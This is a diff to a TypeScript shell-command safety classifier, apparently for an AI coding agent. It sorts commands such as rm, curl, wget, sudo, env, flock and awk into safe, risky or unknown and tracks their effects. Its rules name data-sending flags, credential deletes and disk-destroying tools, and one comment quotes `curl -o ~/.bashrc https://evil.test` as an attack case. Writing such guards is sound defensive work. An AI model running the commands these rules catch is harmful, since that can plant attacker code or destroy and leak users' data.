-  return classifyWords([{ text: tool, quoted: false, glob: false, expansion: false }, ...rest], state, context, depth, true);
+  if (tool === 'vsce' || tool === '@vscode/vsce' || tool === 'ovsx') return rest[0]?.text === 'publish' || rest[0]?.text === 'unpublish' ? risky(`npx ${tool} publish publishes an extension`, publishTo('registry')) : unknownRead(`npx ${tool}`);
+  if (/^(?:semantic-release|np|release-it|changeset|lerna|gh-pages|vercel|netlify|firebase|wrangler|serverless|sls|cdk)$/.test(tool) || RELEASE_NAME.test(rest.map((arg) => arg.text).join(' '))) return risky(`npx ${tool} can publish, release, or deploy`, publishTo(PUBLISH_TOOL_TARGETS[tool] ?? 'release'));
+  // A package npx downloads and runs is like a program the rules do not know: the words after it are probed for a command they tag.
+  if (!DEV_TOOLS.has(tool)) return unknownProgram(tool, rest, state, context, depth, `npx ${tool} may download and run a package`);
+  return classifyWords([{ text: tool, quoted: false, glob: false, expansion: false }, ...rest], state, context, depth + 1, true);
 }
 
 /** A tool in the workspace's own node_modules/.bin, run by path. */
@@ -697,8 +1254,9 @@ function classifySed(args: Word[], state: SegmentState, context: CommandContext)
   }
   if (!scripts.length || scripts.some((script) => !SED_SCRIPT.test(script))) return unknown('sed with a script that may run commands or write other files');
   if (!inPlace) return checkReads(files, state, context, 'sed', true);
-  if (!files.length) return unknown('sed -i without a file');
-  if (files.some((file) => file.glob || file.expansion)) return unknown('sed -i edits files matched at run time');
+  if (!files.length) return unknownRead('sed -i without a file');
+  // The files a wildcard matches inside the project are written as that pattern; one decided at run time, or that may reach outside, is not read.
+  if (files.some((file) => file.glob || file.expansion)) return writeResult('sed -i edits files matched at run time', files, state, context);
   const writes = checkWrites(files, state, context, 'sed -i');
   return writes.verdict === 'safe' ? safe('sed -i edits files inside the workspace') : writes;
 }
@@ -717,13 +1275,32 @@ function classifyAwk(args: Word[], state: SegmentState, context: CommandContext)
     if (program === undefined) { program = text; continue; }
     files.push(args[index]);
   }
-  if (program === undefined || AWK_UNSAFE.test(program)) return unknown('awk with a program that may run commands or write files');
+  if (program === undefined) return unknown('awk without a program');
+  // print and printf redirected to a file named in the program (`print > "out.txt"`) write that file; any other way out (system, a pipe, getline, a
+  // file named by a variable) is not read.
+  if (AWK_UNSAFE.test(program)) {
+    const redirects = [...program.matchAll(/\bprintf?\b[^;}\n]*?(?:>>?)\s*("[^"]*"|[^\s;}]+)/g)].map((match) => match[1]!);
+    const literal = redirects.length > 0 && redirects.every((target) => /^"[^"]+"$/.test(target));
+    const withoutRedirects = program.replace(/\bprintf?\b[^;}\n]*?(?:>>?)\s*"[^"]*"/g, 'print');
+    if (!literal || AWK_UNSAFE.test(withoutRedirects)) return unknown('awk with a program that may run commands or write files');
+    const reads = checkReads(files.filter((file) => !/^[A-Za-z_]\w*=/.test(file.text)), state, context, 'awk', true);
+    if (reads.verdict !== 'safe') return reads;
+    return writeResult('awk writes to a file its program names', redirects.map((target) => ({ text: target.slice(1, -1), quoted: true, glob: false, expansion: false })), state, context);
+  }
   return checkReads(files.filter((file) => !/^[A-Za-z_]\w*=/.test(file.text)), state, context, 'awk', true);
 }
 
 /** Classifies one simple command (no operators). */
 function classifyWords(words: Word[], state: SegmentState, context: CommandContext, depth: number, viaNpx = false): CommandClassification {
+  const deep = tooDeep(depth);
+  if (deep) return deep;
   if (!words.length) return safe('nothing to run');
+  // `{ git push; }`, `then git push`, `exec git push`: the words after are a command too, read here for what they do.
+  if (RUNS_WHAT_FOLLOWS.has(words[0].text) && !(words[0].quoted && words[0].text !== '{')) {
+    const following = words.slice(1);
+    if (following.at(-1)?.text === '}') following.pop();
+    if (following.length) classifyWords(following, state, context, depth + 1);
+  }
   let index = 0;
   let prefixReason: string | undefined;
   // Environment prefixes: FOO=bar cmd.
@@ -732,31 +1309,265 @@ function classifyWords(words: Word[], state: SegmentState, context: CommandConte
     if (!HARMLESS_ENV.has(name)) prefixReason = prefixReason ?? `it sets ${name}, which can change what the command runs`;
     index += 1;
   }
-  if (index >= words.length) return unknown('it sets shell variables for the rest of the session');
+  if (index >= words.length) return unknownRead('it sets shell variables for the rest of the session');
   let program = words[index].text;
   let args = words.slice(index + 1);
   // Wrappers that run the next command as is.
-  while (program === 'time' || program === 'env' || program === 'timeout' || program === 'nice' || program === 'nohup' || program === 'command') {
-    if (program === 'env') {
+  while (['time', 'env', 'timeout', 'nice', 'nohup', 'command', 'stdbuf', 'flock', 'watch'].includes(program)) {
+    if (program === 'stdbuf') {
+      let next = 0;
+      while (next < args.length && looksLikeOption(args[next].text)) {
+        if (/^-[ioe]$/.test(args[next].text)) next += 2;
+        else if (STDBUF_OPTION.test(args[next].text)) next += 1;
+        else return unknownProgram('stdbuf', args.slice(next), state, context, depth);
+      }
+      prefixReason = prefixReason ?? 'stdbuf changes how the command runs';
+      args = args.slice(next);
+    } else if (program === 'flock' || program === 'watch') {
+      // flock [options] <lock file> <command> | -c '<command>'; watch [options] <command> (run by sh -c unless -x). Options may follow flock's lock file.
+      const valueOptions = program === 'flock' ? FLOCK_VALUE_OPTIONS : WATCH_VALUE_OPTIONS;
+      const flags = program === 'flock' ? FLOCK_FLAGS : WATCH_FLAGS;
+      let next = 0;
+      let lock: Word | undefined;
+      let script: Word | undefined;
+      let exec = false;
+      while (next < args.length) {
+        const text = args[next].text;
+        if (program === 'flock' && lock !== undefined && (text === '-c' || text === '--command')) { script = args[next + 1]; next = args.length; break; }
+        if (valueOptions.has(text)) { next += 2; continue; }
+        if (looksLikeOption(text)) {
+          if (!flags.test(text)) return unknownProgram(program, args.slice(next), state, context, depth);
+          if (program === 'watch' && (text === '--exec' || /^-[a-z]*x/.test(text))) exec = true;
+          next += 1;
+          continue;
+        }
+        if (program === 'flock' && lock === undefined) { lock = args[next]; next += 1; continue; }
+        break;
+      }
+      // flock creates its lock file when it is missing: a lock file in a protected place is a write there.
+      if (lock !== undefined) noteEffects(protectedWriteEffects([lock], state, context));
+      prefixReason = prefixReason ?? (program === 'flock' ? 'flock runs the command under a lock' : 'watch runs the command again and again');
+      // watch hands its words to sh -c (unless -x): one quoted word that holds a whole command line is read as one; separate words are read as words.
+      const rest = args.slice(next);
+      const inline = program === 'flock' ? script : !exec && rest.length === 1 && /[\s;&|]/.test(rest[0].text) ? rest[0] : undefined;
+      if (inline !== undefined) {
+        if (inline.expansion) return unknownRead(`${program} runs a command decided at run time`);
+        const inner = classifyText(inline.text, { ...context, cwd: state.cwd }, depth + 1);
+        return inner.verdict === 'safe' ? unknownRead(prefixReason) : inner;
+      }
+      if (program === 'flock' && script === undefined && args.slice(next).length === 0) return unknownRead('flock without a command');
+      args = args.slice(next);
+    } else if (program === 'env') {
       let next = 0;
       while (next < args.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(args[next].text)) { const name = args[next].text.split('=')[0]; if (!HARMLESS_ENV.has(name)) prefixReason = prefixReason ?? `it sets ${name}`; next += 1; }
-      if (next < args.length && looksLikeOption(args[next].text)) return unknown('env with options');
-      if (next >= args.length) return unknown('env prints environment variables, which may include secrets');
+      // env's own options (PR #74 review round 8): -i and -0 change nothing it runs; -u names a variable; -C moves the folder; -S is a command line.
+      while (next < args.length && looksLikeOption(args[next].text)) {
+        const text = args[next].text;
+        if (/^-[i0v]+$|^--(?:ignore-environment|null|debug)$/.test(text)) { next += 1; continue; }
+        if (text === '-u' || text === '--unset') { next += 2; continue; }
+        if (/^-u.+|^--unset=/.test(text)) { next += 1; continue; }
+        const chdir = /^(?:-C|--chdir)(?:=(.*))?$/.exec(text);
+        if (chdir) {
+          const folder = chdir[1] !== undefined ? { ...args[next], text: chdir[1] } : args[next + 1];
+          if (folder === undefined || folder.expansion || folder.glob) return unknown('env -C moves to a folder decided at run time');
+          state = { ...state, cwd: path.resolve(state.cwd, folder.text) };
+          next += chdir[1] !== undefined ? 1 : 2;
+          continue;
+        }
+        const split = /^(?:-S|--split-string)(?:=(.*))?$/.exec(text);
+        if (split) {
+          const line = split[1] !== undefined ? { ...args[next], text: split[1] } : args[next + 1];
+          if (line === undefined || line.expansion) return unknown('env -S runs a command decided at run time');
+          const rest = args.slice(next + (split[1] !== undefined ? 1 : 2)).map((arg) => arg.text).join(' ');
+          const inner = classifyText(`${line.text} ${rest}`.trim(), { ...context, cwd: state.cwd }, depth + 1);
+          return inner.verdict === 'safe' ? unknownRead('env -S runs a command line') : inner;
+        }
+        return unknown('env with options');
+      }
+      while (next < args.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(args[next].text)) { const name = args[next].text.split('=')[0]; if (!HARMLESS_ENV.has(name)) prefixReason = prefixReason ?? `it sets ${name}`; next += 1; }
+      if (next >= args.length) return unknownRead('env prints environment variables, which may include secrets');
+      prefixReason = prefixReason ?? (args.slice(0, next).some((arg) => looksLikeOption(arg.text)) ? 'env with options changes what the command runs with' : undefined);
       args = args.slice(next);
     } else if (program === 'timeout') {
-      if (!args[0] || !/^\d+(?:\.\d+)?[smhd]?$/.test(args[0].text)) return unknown('timeout with options');
-      args = args.slice(1);
+      // timeout's own options (PR #74 review round 8), then the duration.
+      let next = 0;
+      while (next < args.length && looksLikeOption(args[next].text)) {
+        const text = args[next].text;
+        if (/^--(?:preserve-status|foreground|verbose)$|^-v$/.test(text) || /^-[sk].+|^--(?:signal|kill-after)=/.test(text)) { next += 1; continue; }
+        if (/^-[sk]$|^--(?:signal|kill-after)$/.test(text)) { next += 2; continue; }
+        return unknown('timeout with options');
+      }
+      if (!args[next] || !/^\d+(?:\.\d+)?[smhd]?$/.test(args[next].text)) return unknown('timeout with options');
+      args = args.slice(next + 1);
     } else if (program !== 'time') {
       prefixReason = prefixReason ?? `${program} changes how the command runs`;
     }
-    if (!args.length) return unknown(`${program} alone`);
+    if (!args.length) return unknownRead(`${program} alone`);
     program = args[0].text;
     args = args.slice(1);
   }
   const name = programName(program);
   const result = classifyProgram(name, program, args, state, context, depth, viaNpx);
-  if (result.verdict === 'safe' && prefixReason) return unknown(prefixReason);
+  if (result.verdict === 'safe' && prefixReason) return unknownRead(prefixReason);
   return result;
+}
+
+/**
+ * What a delete destroys, for its effect tag (D-17). A recursive delete is destruction unless every target is a temporary folder or build output the
+ * classifier already lets go; a plain delete is destruction only outside the workspace and its scratch folders. Either is a protected write when it removes
+ * something in .git, .planning/.near-ai or .near-ai. No target, no tag.
+ */
+function deleteEffects(name: string, targets: readonly Word[], args: readonly Word[], state: SegmentState, context: CommandContext): CommandEffect[] {
+  if (!targets.length) return [];
+  const root = path.resolve(context.root);
+  const facts = (arg: Word): PathFacts => pathFacts(arg.text, state.cwd, context);
+  // Inside a temporary folder (never the folder itself), and holding neither the project nor the home folder. A temporary folder that is `/` or holds the
+  // home folder (a TMPDIR set that way) counts for nothing.
+  const home = context.home ? path.resolve(context.home) : undefined;
+  const temporary = temporaryCandidates(context).filter((candidate) => candidate !== path.parse(candidate).root && !(home !== undefined && isInside(candidate, home)));
+  // Never a path inside the project either: a project kept in a temporary folder is still the project (PR #74 review round 7).
+  const temporaryPath = (absolute: string): boolean =>
+    temporary.some((folder) => absolute !== folder && isInside(folder, absolute)) && !isInside(absolute, root) && !isInside(root, absolute) && !(home !== undefined && isInside(absolute, home));
+  // Where a delete really lands: the folders on the way resolved through links (rm does not follow the last part, unless it ends with a slash).
+  const landsAt = (arg: Word): string => {
+    const absolute = facts(arg).absolute;
+    return /\/\.?$/.test(arg.text) ? realPathOrSelf(absolute) : path.join(realPathOrSelf(path.dirname(absolute)), path.basename(absolute));
+  };
+  // The project's own scratch folder (PR #74 review round 5): strictly inside it, named with no `..`, and landing inside it however links resolve. Never
+  // the folder itself, its parents or the project.
+  const projectScratch = path.join(root, '.near-ai', 'scratch');
+  const realScratch = realPathOrSelf(projectScratch);
+  const inProjectScratch = (arg: Word): boolean => {
+    if (arg.glob || arg.expansion || arg.text.split(/[\\/]/).includes('..')) return false;
+    const absolute = facts(arg).absolute;
+    const real = realPathOrSelf(absolute);
+    const strictly = (folder: string, target: string): boolean => target !== folder && isInside(folder, target);
+    return strictly(projectScratch, absolute) && strictly(realScratch, landsAt(arg)) && strictly(realScratch, real);
+  };
+  const recursive = name === 'rm' && args.some((arg) => /^-(?:[A-Za-z]*[rR][A-Za-z]*)$|^--recursive$/.test(arg.text));
+  if (recursive) {
+    // Every target is scratch work: a temporary folder's contents, the project's scratch folder's contents, or build output the project makes again.
+    const excused = targets.every((arg) => {
+      if (arg.glob || arg.expansion) return false;
+      const found = facts(arg);
+      if (temporaryPath(found.absolute) || inProjectScratch(arg)) return true;
+      return found.inside && found.absolute !== root && !found.protectedWrite && BUILD_OUTPUT.has(path.basename(found.absolute));
+    });
+    if (excused) return [];
+    return destroyPaths(targets.map((arg) => (arg.glob && !isWorkspaceGlob(arg, state, context) ? '**' : effectPath(arg, state, context))));
+  }
+  // A plain delete is destruction outside the project, where it really lands (a link on the way out of the project counts), unless that is scratch.
+  const realRoot = realPathOrSelf(root);
+  const outside = targets.some((arg) => {
+    if (arg.expansion) return false;
+    const found = facts(arg);
+    if (found.device || inProjectScratch(arg)) return false;
+    const leaves = !found.inside || !isInside(realRoot, landsAt(arg));
+    return leaves && !(found.scratch && !found.inside) && !temporaryPath(found.absolute) && !temporaryPath(landsAt(arg));
+  });
+  return [...(outside ? DESTROY_ALL : []), ...protectedWriteEffects(targets, state, context)];
+}
+
+/**
+ * A program tagged by its subcommand, read after its global options. An option the rules do not know there makes the effects unknown. An option that moves
+ * the folder (git -C, terraform -chdir, pulumi --cwd, cargo -C) moves it for the subcommand's paths; a folder decided at run time is unknown. The verdict
+ * is never newly safe: options that take a value (or any but --no-pager for git, docker and podman, which never read past an option before) leave a
+ * harmless subcommand unknown, as it was.
+ */
+function classifyAfterGlobals(name: string, program: string, args: Word[], state: SegmentState, context: CommandContext, depth: number, viaNpx: boolean): CommandClassification {
+  const found = skipGlobals(name, args);
+  if ('unknown' in found) return beyondReach(found.unknown);
+  let moved = state;
+  if (found.folder !== undefined) {
+    if (found.folder.expansion || found.folder.glob) return beyondReach(`${name} works in a folder decided at run time`);
+    moved = { ...state, cwd: path.resolve(state.cwd, found.folder.text) };
+  }
+  if (found.rest.length === 0) return unknownRead(`${name} ${found.skipped.join(' ')}`.trim());
+  // Strictly fewer words and none of them a leading option, so this reads the subcommand and cannot come back here.
+  const inner = classifyProgram(name, program, found.rest, moved, context, depth, viaNpx);
+  if (inner.verdict !== 'safe') return inner;
+  const strict = ['git', 'docker', 'podman', 'go'].includes(name) && !found.skipped.every((option) => option === '--no-pager');
+  return found.valued || strict ? unknownRead(`${name} with options before its subcommand acts on something they name`) : inner;
+}
+
+/**
+ * The files a download that is not plain writes, read from its options (PR #74 review round 8, refinement): curl's `-o`/`--output`, `-O` (the URL's file
+ * name), `--output-dir`; wget's `-O`/`--output-document`, `-P`/`--directory-prefix`, else the URL's file name, and a recursive fetch's host folder. With
+ * no file named, it writes none. Options that read more options from elsewhere (curl -K, wget -e and --config) are not read: the effects are unknown.
+ */
+function downloadWrites(name: string, args: readonly Word[], state: SegmentState, context: CommandContext, reason: string): CommandClassification {
+  const words = args.map((arg) => arg.text);
+  if (words.some((word) => /^(?:-K|--config|-e|--execute|--next|-:)(?:=|$)/.test(word) || (name === 'curl' && /^-[A-Za-z]*K/.test(word)))) return unknown(`${reason}, with options read from elsewhere`);
+  const urls = words.filter((word) => /^https?:\/\//i.test(word));
+  const fileOf = (url: string): string => { try { return path.posix.basename(new URL(url).pathname) || 'index.html'; } catch { return 'index.html'; } };
+  const valueOf = (pattern: RegExp): Word | undefined => {
+    for (const [at, arg] of args.entries()) {
+      const match = pattern.exec(arg.text);
+      if (!match) continue;
+      return match[1] ? { ...arg, text: match[1] } : args[at + 1];
+    }
+    return undefined;
+  };
+  const named = (text: string): Word => ({ text, quoted: false, glob: false, expansion: false });
+  const targets: Word[] = [];
+  if (name === 'curl') {
+    const folder = valueOf(/^--output-dir(?:=(.+))?$/);
+    const inFolder = (file: string): string => (folder === undefined ? file : path.join(folder.text, file));
+    for (const [at, arg] of args.entries()) {
+      const output = /^(?:-o|--output)(?:=(.+))?$/.exec(arg.text) ?? /^-o(.+)$/.exec(arg.text);
+      if (output) { const value = output[1] ? { ...arg, text: output[1] } : args[at + 1]; if (value) targets.push(value.text === '-' ? named('/dev/stdout') : { ...value, text: inFolder(value.text) }); }
+    }
+    if (words.some((word) => /^(?:-O|--remote-name|--remote-name-all)$|^-[A-Za-z]*O[A-Za-z]*$/.test(word))) targets.push(...urls.map((url) => named(inFolder(fileOf(url)))));
+    if (folder?.expansion) return unknown(`${reason}, to a folder decided at run time`);
+  } else {
+    const document = valueOf(/^(?:-O|--output-document)(?:=(.+))?$/);
+    const prefix = valueOf(/^(?:-P|--directory-prefix)(?:=(.+))?$/);
+    if (prefix?.expansion) return unknown(`${reason}, to a folder decided at run time`);
+    const under = (file: string): string => (prefix === undefined ? file : path.join(prefix.text, file));
+    if (document !== undefined) targets.push(document.text === '-' ? named('/dev/stdout') : document);
+    else if (words.some((word) => /^(?:-r|--recursive|-m|--mirror)$/.test(word))) targets.push(...urls.map((url) => { try { return named(under(new URL(url).host)); } catch { return named(under('.')); } }));
+    else targets.push(...urls.map((url) => named(under(fileOf(url)))));
+  }
+  return writeResult(reason, targets, state, context);
+}
+
+/** What `sudo`, `doas`, `pkexec` or `su -c` would run, read for its effects; the privilege itself is already risky. */
+function noteRunsAs(name: string, args: readonly Word[], state: SegmentState, context: CommandContext, depth: number): void {
+  if (name === 'su') {
+    const at = args.findIndex((arg) => arg.text === '-c' || arg.text === '--command');
+    const script = at < 0 ? undefined : args[at + 1];
+    if (script !== undefined && !script.expansion) classifyText(script.text, { ...context, cwd: state.cwd }, depth + 1);
+    return;
+  }
+  let index = 0;
+  while (index < args.length && looksLikeOption(args[index].text)) index += PRIVILEGE_VALUE_OPTIONS.has(args[index].text) ? 2 : 1;
+  if (args[index]?.text === '--') index += 1;
+  const inner = args.slice(index);
+  if (inner.length) classifyWords([...inner], state, context, depth + 1);
+}
+
+/** The script `bash -c '…'` (or `sh -c`, `bash -lc`, …) or `eval …` runs, read for its effects. The verdict stays the rules' own: such code is not checked. */
+function noteInlineScript(name: string, args: readonly Word[], state: SegmentState, context: CommandContext, depth: number): void {
+  if (name === 'eval') {
+    const text = args.map((arg) => arg.text).join(' ');
+    if (text.trim()) classifyText(text, { ...context, cwd: state.cwd }, depth + 1);
+    return;
+  }
+  if (!SHELLS.has(name)) return;
+  const at = args.findIndex((arg) => /^-[A-Za-z]*c[A-Za-z]*$/.test(arg.text));
+  if (at < 0) return;
+  let index = at + 1;
+  while (index < args.length && (looksLikeOption(args[index].text) || args[index].text === '--')) index += 1;
+  const script = args[index];
+  if (script !== undefined && !script.expansion) classifyText(script.text, { ...context, cwd: state.cwd }, depth + 1);
+}
+
+/** The protected places a segment's redirects write, tagged whatever else decides the segment (D-44). */
+function noteRedirectWrites(redirects: readonly Redirect[], state: SegmentState, context: CommandContext): void {
+  const targets = redirects
+    .filter((redirect) => redirect.op !== '<' && redirect.op !== '<<' && redirect.op !== '<<<' && !(redirect.op.endsWith('&') && redirect.target && /^[0-9-]+$/.test(redirect.target.text)))
+    .flatMap((redirect) => (redirect.target === undefined || redirect.target.glob ? [] : [redirect.target]));
+  noteEffects(protectedWriteEffects(targets, state, context));
 }
 
 function classifyProgram(name: string, program: string, args: Word[], state: SegmentState, context: CommandContext, depth: number, viaNpx: boolean): CommandClassification {
@@ -767,42 +1578,54 @@ function classifyProgram(name: string, program: string, args: Word[], state: Seg
   if (program === 'gsd_run' && context.gsdRunDefined) return classifyGsdTools(args, state, context);
   // The managed Open-GSD runtime's own launcher, named by its absolute path.
   if (program.includes('/') && isTrustedGsdTool({ text: program, quoted: false, glob: false, expansion: false }, state, context)) return classifyGsdTools(args, state, context);
+  // A program tagged by its subcommand, with global options before it: they are skipped, so the subcommand is read (PR #74 review round 7).
+  const leading = args[0];
+  if (GLOBAL_OPTIONS[name] !== undefined && !PACKAGE_MANAGERS.has(name) && leading !== undefined && (looksLikeOption(leading.text) || (name === 'cargo' && leading.text.startsWith('+')))) {
+    return classifyAfterGlobals(name, program, args, state, context, depth, viaNpx);
+  }
   // Risky whatever the path.
-  if (PRIVILEGE.has(name)) return risky(`${name} runs a command with elevated privileges`);
+  if (PRIVILEGE.has(name)) {
+    noteRunsAs(name, args, state, context, depth);
+    return risky(`${name} runs a command with elevated privileges`);
+  }
   if (POWER.has(name)) return risky(`${name} stops or restarts the machine`);
-  if (DISK_DESTROYERS.has(name) || /^mkfs(?:\.|$)/.test(name)) return risky(`${name} can destroy file or disk contents beyond recovery`);
+  if (DISK_DESTROYERS.has(name) || /^mkfs(?:\.|$)/.test(name)) return risky(`${name} can destroy file or disk contents beyond recovery`, DESTROY_ALL);
   if (NETWORK_SENDERS.has(name)) return risky(`${name} can send data off this machine`);
   if (name === 'rm' || name === 'rmdir' || name === 'unlink') {
     const targets = args.filter((arg) => !looksLikeOption(arg.text) && arg.text !== '--');
+    noteEffects(deleteEffects(name, targets, args, state, context));
     const sensitive = targets.find((arg) => pathFacts(arg.text, state.cwd, context).sensitive);
     if (sensitive) return risky(`${name} deletes ${sensitive.text}, which may hold credentials or knowledge-base keys`);
     if (name === 'rm' && anyFlag(/^-(?:[A-Za-z]*[rR][A-Za-z]*)$|^--recursive$/)) {
       const temporary = targets.length > 0 && targets.every((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return !arg.glob && /^\/tmp\/[^/]+/.test(facts.absolute) && !facts.absolute.split('/').includes('..'); });
-      if (temporary) return unknown('rm -r of a temporary path');
+      if (temporary) return unknownRead('rm -r of a temporary path');
       if (!targets.length || targets.some((arg) => arg.glob || arg.expansion || !pathFacts(arg.text, state.cwd, context).inside)) return risky('rm -r deletes folders beyond recovery, outside the workspace or decided at run time');
       if (targets.some((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return facts.protectedWrite || facts.absolute === path.resolve(context.root); })) return risky('rm -r deletes the whole workspace, .git, .planning/.near-ai or .near-ai');
       // Folders a build or install regenerates (dist, node_modules, …) can go; anything else inside the workspace goes to the safety model.
       const regenerable = targets.every((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return facts.absolute !== path.resolve(context.root) && !facts.protectedWrite && BUILD_OUTPUT.has(path.basename(facts.absolute)); });
-      return regenerable ? safe('rm -r only deletes build output inside the workspace, which a build or install recreates') : unknown('rm -r deletes folders inside the workspace');
+      return regenerable ? safe('rm -r only deletes build output inside the workspace, which a build or install recreates') : unknownRead('rm -r deletes folders inside the workspace');
     }
-    if (!targets.length) return unknown(`${name} without a file`);
+    if (!targets.length) return unknownRead(`${name} without a file`);
     const outside = targets.find((arg) => !pathFacts(arg.text, state.cwd, context).inside);
     if (outside) return risky(`${name} deletes ${outside.text}, outside the workspace`);
-    if (targets.some((arg) => arg.glob || arg.expansion)) return unknown(`${name} deletes files matched at run time`);
+    if (targets.some((arg) => arg.glob || arg.expansion)) return unknownRead(`${name} deletes files matched at run time`);
     const guarded = targets.find((arg) => { const facts = pathFacts(arg.text, state.cwd, context); return facts.protectedWrite || facts.absolute === path.resolve(context.root); });
     if (guarded) return risky(`${name} deletes ${guarded.text}, inside .git, .planning/.near-ai or .near-ai (other than its scratch and attachments folders), where writes always ask`);
     return safe(`${name} deletes ${targets.length === 1 ? 'a file' : 'files'} inside the workspace`);
   }
   if (name === 'find') {
-    if (words.includes('-delete')) return risky('find -delete deletes files');
+    if (words.includes('-delete')) return risky('find -delete deletes files', DESTROY_ALL);
     const execAt = words.findIndex((word) => ['-exec', '-execdir', '-ok', '-okdir'].includes(word));
     if (execAt >= 0) {
       const innerWords = args.slice(execAt + 1).filter((arg) => arg.text !== ';' && arg.text !== '+' && arg.text !== '{}');
-      if (DELETERS.has(programName(innerWords[0]?.text ?? ''))) return risky(`find -exec ${innerWords[0].text} deletes every match`);
+      if (DELETERS.has(programName(innerWords[0]?.text ?? ''))) return risky(`find -exec ${innerWords[0].text} deletes every match`, DESTROY_ALL);
       const inner = classifyWords(innerWords, state, context, depth + 1);
-      return inner.verdict === 'risky' ? risky(`find -exec runs a command for every match, and ${inner.reason}`) : unknown('find -exec runs a command for every match');
+      return inner.verdict === 'risky' ? risky(`find -exec runs a command for every match, and ${inner.reason}`) : unknownRead('find -exec runs a command for every match');
     }
-    if (words.some((word) => /^-f(?:print|print0|printf|ls)$/.test(word))) return unknown('find writes its results to a file');
+    if (words.some((word) => /^-f(?:print|print0|printf|ls)$/.test(word))) {
+      const targets = args.flatMap((arg, at) => (/^-f(?:print|print0|printf|ls)$/.test(arg.text) && args[at + 1] !== undefined ? [args[at + 1]!] : []));
+      return writeResult('find writes its results to a file', targets, state, context);
+    }
     // The first arguments up to the first expression are the paths searched.
     // The paths searched and any file an expression names (-newer, -samefile) must be inside the workspace.
     const reads = checkReads(args, state, context, 'find', true);
@@ -814,20 +1637,25 @@ function classifyProgram(name: string, program: string, args: Word[], state: Seg
     // The first operand is the mode or owner; the rest are paths.
     const paths = args.filter((arg) => !looksLikeOption(arg.text)).slice(1);
     const outside = paths.find((arg) => !pathFacts(arg.text, state.cwd, context).inside);
-    if (outside) return risky(`${name} changes permissions on ${outside.text}, outside the workspace`);
+    if (outside) return writeResult(`${name} changes permissions on ${outside.text}, outside the workspace`, paths, state, context, 'risky');
     const sensitive = paths.find((arg) => pathFacts(arg.text, state.cwd, context).sensitive);
-    if (sensitive) return risky(`${name} changes permissions on ${sensitive.text}, which may hold credentials`);
-    return unknown(`${name} changes file permissions`);
+    if (sensitive) return writeResult(`${name} changes permissions on ${sensitive.text}, which may hold credentials`, paths, state, context, 'risky');
+    // Options other than these change what the operands mean (--reference names a file to copy from).
+    if (args.some((arg) => looksLikeOption(arg.text) && !/^-[RvcfhH]+$|^--(?:recursive|verbose|changes|silent|quiet|no-dereference)$/.test(arg.text))) return unknown(`${name} with an option the rules do not check`);
+    return writeResult(`${name} changes file permissions`, paths, state, context);
   }
   if (name === 'kill' || name === 'pkill' || name === 'killall' || name === 'skill') {
     if (name !== 'kill') return risky(`${name} kills processes by name`);
-    return words.some((word) => word === '-1' || word === '0' || word === '-0') ? risky('kill -1 or kill 0 kills every process it can') : unknown('kill stops a process');
+    return words.some((word) => word === '-1' || word === '0' || word === '-0') ? risky('kill -1 or kill 0 kills every process it can') : unknownRead('kill stops a process');
   }
   if (name === 'curl' || name === 'wget' || name === 'http' || name === 'https' || name === 'httpie' || name === 'xh') {
     if (anyFlag(/^-(?:[A-Za-z]*[dFT][A-Za-z]*)$|^--(?:data|data-binary|data-raw|data-urlencode|form|form-string|upload-file|json|post-data|post-file|body-data|body-file|method)(?:=|$)/) || words.some((word, at) => (word === '-X' || word === '--request') && /^(?:POST|PUT|PATCH|DELETE)$/i.test(words[at + 1] ?? '')) || /^-X(?:POST|PUT|PATCH|DELETE)$/i.test(words.find((word) => /^-X./.test(word)) ?? '')) return risky(`${name} sends data off this machine`);
     if (name === 'http' || name === 'https' || name === 'xh') return risky(`${name} can send data off this machine`);
     // 0.4.18: a download is safe when it is a PLAIN one: one http(s) URL and only flags known to send nothing (src/domain/plainDownload.ts). The rule
     // fails closed, so a flag curl adds later, or one nobody thought of, asks instead of slipping through. Anything that carries data is risky above.
+    // A word the shell decides at run time ($O, $(...)) reaches plainDownload as empty text, so it is not a plain download: where it writes, or what it
+    // fetches, is not in the text (PR #74 review round 8).
+    if (args.some((arg) => arg.expansion)) return unknown(`${name} with a part the shell decides at run time`);
     const download = plainDownload(args.map((arg) => arg.text), name);
     if (download.plain) {
       // 0.4.18 review: a write target is judged like any other write. `curl -o ~/.bashrc https://evil.test` would otherwise put attacker bytes into a
@@ -835,23 +1663,44 @@ function classifyProgram(name: string, program: string, args: Word[], state: Seg
       if (download.output !== undefined) {
         const target = pathFacts(download.output, state.cwd, context);
         if (!target.inside && !scratchFacts(download.output, target.absolute, target.sensitive, context)) {
+          // Outside the project and scratch, the write is not one the run may make: effects unknown, as for every other named write there.
           return unknown(`${name} downloads a file to ${download.output}, which is outside the project`);
         }
+        // The file it writes inside the project is a write there (a protected place asks, PR #74 review round 8). The word as written says whether the
+        // shell decides it at run time.
+        const written = args.find((arg) => arg.text === download.output || arg.text === `-o${download.output}` || arg.text === `--output=${download.output}`);
+        return writeResult(`${name} downloads a page and sends nothing of this run's with it`, [{ text: download.output, quoted: false, glob: false, expansion: written?.expansion ?? true }], state, context, 'safe');
       }
       return safe(`${name} downloads a page and sends nothing of this run's with it`);
     }
     // 0.4.18 review: say why, rather than falling through to "not a command the rules know", which would be a wrong explanation for `curl --netrc`.
-    return unknown(`${name} ${download.reason ?? 'is not a plain download'}`);
+    return downloadWrites(name, args, state, context, `${name} ${download.reason ?? 'is not a plain download'}`);
   }
-  if (name === 'rsync') return words.some((word) => !looksLikeOption(word) && /^[^/]*:|^[\w.-]+@/.test(word)) ? risky('rsync copies to or from another machine') : unknown('rsync copies files');
-  if (name === 'crontab') return words.length === 1 && words[0] === '-l' ? unknown('crontab -l') : risky('crontab changes scheduled jobs');
-  if (name === 'systemctl' || name === 'service' || name === 'launchctl') return words.some((word) => /^(?:start|stop|restart|reload|enable|disable|mask|unmask|kill|load|unload|bootstrap|bootout|daemon-reload)$/.test(word)) ? risky(`${name} changes system services`) : unknown(`${name}`);
+  if (name === 'rsync') {
+    if (words.some((word) => !looksLikeOption(word) && /^[^/]*:|^[\w.-]+@/.test(word))) return risky('rsync copies to or from another machine');
+    // The destination is the last operand; --delete removes what is there and is not in the source. Options with a value as the next word are skipped.
